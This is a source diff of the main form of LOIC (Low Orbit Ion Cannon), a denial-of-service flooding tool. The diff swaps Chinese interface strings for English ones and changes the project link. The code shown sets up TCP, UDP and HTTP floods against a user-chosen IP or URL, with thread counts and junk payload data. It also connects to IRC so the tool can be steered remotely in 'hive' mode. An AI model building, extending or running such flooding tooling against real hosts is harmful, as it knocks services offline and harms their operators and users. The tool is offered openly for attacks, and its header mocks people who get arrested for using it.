@@ -1,4 +1,4 @@
-﻿/* LOIC - Low Orbit Ion Cannon
+/* LOIC - Low Orbit Ion Cannon
  * Released to the public domain
  * Enjoy getting v&, kids.
  */
@@ -50,19 +50,19 @@ namespace LOIC
 		}
 		private void Attack(bool toggle, bool on, bool silent)
 		{
-			if((cmdAttack.Text == "开 始 爆 菊" && toggle == true) || (toggle == false && on == true))
+			if((cmdAttack.Text == "IMMA CHARGIN MAH LAZER" && toggle == true) || (toggle == false && on == true))
 			{
 				try
 				{
 					try { iPort = Convert.ToInt32(txtPort.Text); }
-					catch { throw new Exception("端口你填了没？"); }
+					catch { throw new Exception("I don't think ports are supposed to be written like THAT."); }
 
 					try { iThreads = Convert.ToInt32(txtThreads.Text); }
-					catch { throw new Exception("线程数你填了没？"); }
+					catch { throw new Exception("What on earth made you put THAT in the threads field?"); }
 
 					sIP = txtTarget.Text;
-                    if (String.IsNullOrEmpty(sIP) || String.Equals(sIP, "未 锁 定 !"))
-						throw new Exception("先锁定目标");
+					if(String.IsNullOrEmpty(sIP) || String.Equals(sIP, "N O N E !"))
+						throw new Exception("Select a target.");
 
 					if( String.IsNullOrEmpty(sHost) ) sHost = sIP;
 					if( !sHost.Contains("://") ) sHost = String.Concat("http://", sHost);
@@ -74,25 +74,25 @@ namespace LOIC
 					if(String.Equals(sMethod, "UDP")) iProtocol = 2;
 					if(String.Equals(sMethod, "HTTP")) iProtocol = 3;
 					if(iProtocol == 0)
-						throw new Exception("选择爆菊方式");
+						throw new Exception("Select a proper attack method.");
 
 					sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
 					if(String.IsNullOrEmpty(sData) && (iProtocol == 1 || iProtocol == 2))
-						throw new Exception("你需要填写爆菊时发送的垃圾数据");
+						throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");
 
 					sSubsite = txtSubsite.Text;
 					if(!sSubsite.StartsWith("/") && (iProtocol == 3))
-						throw new Exception("你必须输入一个子站 (如 \"/\")");
+						throw new Exception("You have to enter a subsite (for example \"/\")");
 
 					try { iTimeout = Convert.ToInt32(txtTimeout.Text); }
-					catch { throw new Exception("你填写好超时设定了么？"); }
+					catch { throw new Exception("What's up with something like that in the timeout box? =S"); }
 				}
 				catch (Exception ex)
 				{
 					if(silent) return;
-					new frmWtf().Show(); MessageBox.Show(ex.Message, "你干了什么！！"); return;
+					new frmWtf().Show(); MessageBox.Show(ex.Message, "What the shit."); return;
 				}
-				cmdAttack.Text = "停 止 爆 菊";
+				cmdAttack.Text = "Stop flooding";
 
 				if(String.Equals(sMethod, "TCP") || String.Equals(sMethod, "UDP"))
 				{
@@ -116,7 +116,7 @@ namespace LOIC
 			}
 			else if(toggle == true || on == false)
 			{
-				cmdAttack.Text = "开 始 爆 菊";
+				cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
 				if(xxp != null)
 				{
 					for (int a = 0; a < xxp.Length; a++)
@@ -140,7 +140,7 @@ namespace LOIC
 			{
 				if(silent) return;
 				new frmWtf().Show();
-				MessageBox.Show("你忘输IP了");
+				MessageBox.Show("I think you forgot the IP.", "What the shit.");
 				return;
 			}
 			txtTarget.Text = txtTargetIP.Text;
@@ -153,7 +153,7 @@ namespace LOIC
 			{
 				if(silent) return;
 				new frmWtf().Show();
-				MessageBox.Show("你忘输URL了");
+				MessageBox.Show("A URL is fine too...", "What the shit.");
 				return;
 			}
 			if( !sHost.StartsWith("http://") && !sHost.StartsWith("https://") ) sHost = String.Concat("http://", sHost);
@@ -162,7 +162,7 @@ namespace LOIC
 			{
 				if(silent) return;
 				new frmWtf().Show();
-				MessageBox.Show("这个URL没有指向任何IP");
+				MessageBox.Show("The URL you entered does not resolve to an IP!", "What the shit.");
 				return;
 			}
 		}
@@ -183,7 +183,7 @@ namespace LOIC
 				if(disableHive.Checked && enabled)
 				{
 					new frmWtf().Show();
-					MessageBox.Show("你输入IRC地址了吗？");
+					MessageBox.Show("Did you filled IRC options correctly?", "What the shit.");
 					return;
 				}
 
@@ -196,7 +196,7 @@ namespace LOIC
 				ircenabled = enabled;
 				if(enabled)
 				{
-					label25.Text = "连接中..";
+					label25.Text = "Connecting..";
 					irc = new IrcClient();
 					irc.OnConnected += IrcConnected;
 					irc.OnReadLine += OnReadLine;
@@ -237,7 +237,7 @@ namespace LOIC
 					}
 					catch
 					{ }
-					label25.Text = "未连接";
+					label25.Text = "Disconnected.";
 				}
 			}
 			catch
@@ -267,12 +267,12 @@ namespace LOIC
 		}
 		private void IrcConnected(object o, EventArgs e)
 		{
-			label25.Text = "登录中...";
+			label25.Text = "Logging In...";
 		}
 		private delegate void AddListBoxItemDelegate(object sender, ReadLineEventArgs e);
 		void OnNames(object sender, NamesEventArgs e)
 		{
-			SetStatus("连接成功!");
+			SetStatus("Connected!");
 			if(OpList != null)
 			{
 				OpList.Clear();
@@ -540,7 +540,7 @@ namespace LOIC
 		}
 		private void frmMain_Load(object sender, EventArgs e)
 		{
-            this.Text = String.Format("LOIC-阿姆斯特朗回旋加速喷气式阿姆斯特朗炮  | darknessomi 汉化 | v. {0}", Application.ProductVersion);
+			this.Text = String.Format("{0} | U dun goofed | v. {1}", Application.ProductName, Application.ProductVersion);
 		}
 		private void frmMain_Closing(object sender, FormClosingEventArgs e)
 		{
@@ -670,27 +670,7 @@ namespace LOIC
 		}
 		private void label24_Click(object sender, EventArgs e)
 		{
-            System.Diagnostics.Process.Start("http://github.com/darknessomi/LOIC-CN");
+			System.Diagnostics.Process.Start("http://github.com/NewEraCracker/LOIC");
 		}
-
-        private void pBanner_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void txtData_TextChanged(object sender, EventArgs e)
-        {
-
-        }
-
-        private void cbMethod_SelectedIndexChanged(object sender, EventArgs e)
-        {
-
-        }
-
-        private void label25_Click(object sender, EventArgs e)
-        {
-
-        }
 	}
 }
